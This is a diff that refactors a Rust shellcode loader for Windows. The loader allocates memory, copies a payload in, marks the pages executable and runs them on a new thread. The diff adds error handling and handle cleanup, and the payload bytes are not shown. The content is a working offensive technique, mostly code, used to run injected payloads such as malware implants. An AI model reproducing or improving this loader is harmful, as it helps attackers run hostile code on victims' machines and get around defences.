@@ -1,10 +1,13 @@
 use std::ptr::{copy, null, null_mut};
-use windows::Win32::System::Memory::{
-    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-};
-use windows::Win32::System::Threading::{
-    CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
+use windows::Win32::{
+    Foundation::{CloseHandle, GetLastError},
+    System::{
+        Memory::{
+            VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+            PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+        },
+        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
+    },
 };
 
 fn main() {
@@ -33,40 +36,38 @@ fn main() {
 
     unsafe {
         println!("[+] Memory Allocation Being Performed");
-        let shellcode_addr = VirtualAlloc(
+        let address = VirtualAlloc(
             Some(null_mut()),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
 
+        if address.is_null() {
+            eprintln!("[!] VirtualAlloc Failed With Error: {:?}", GetLastError());
+            return;
+        }
+
         println!("[+] Copying a Shellcode To Target Memory");
-        copy(shellcode.as_ptr() as _, shellcode_addr, shellcode.len());
+        copy(shellcode.as_ptr() as _, address, shellcode.len());
 
         println!("[+] Changing Page Permissions");
-        let mut old_protection: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(
-            shellcode_addr,
-            shellcode.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protection,
-        ).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtect Failed With Error: {e}");
-        });
+        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
+        VirtualProtect(address, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protection).expect("[!] VirtualProtect Failed With Error");
 
         println!("[+] Thread Being Created");
         let hthread = CreateThread(
             Some(null()),
             0,
-            Some(std::mem::transmute(shellcode_addr)),
+            Some(std::mem::transmute(address)),
             Some(null()),
             THREAD_CREATION_FLAGS(0),
             Some(null_mut()),
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateThread Failed With Error: {e}");
-        });
+        ).expect("[!] CreateThread Failed With Error");
 
         println!("[+] Shellcode Executed!");
         WaitForSingleObject(hthread, INFINITE);
+
+        let _ = CloseHandle(hthread);
     }
 }
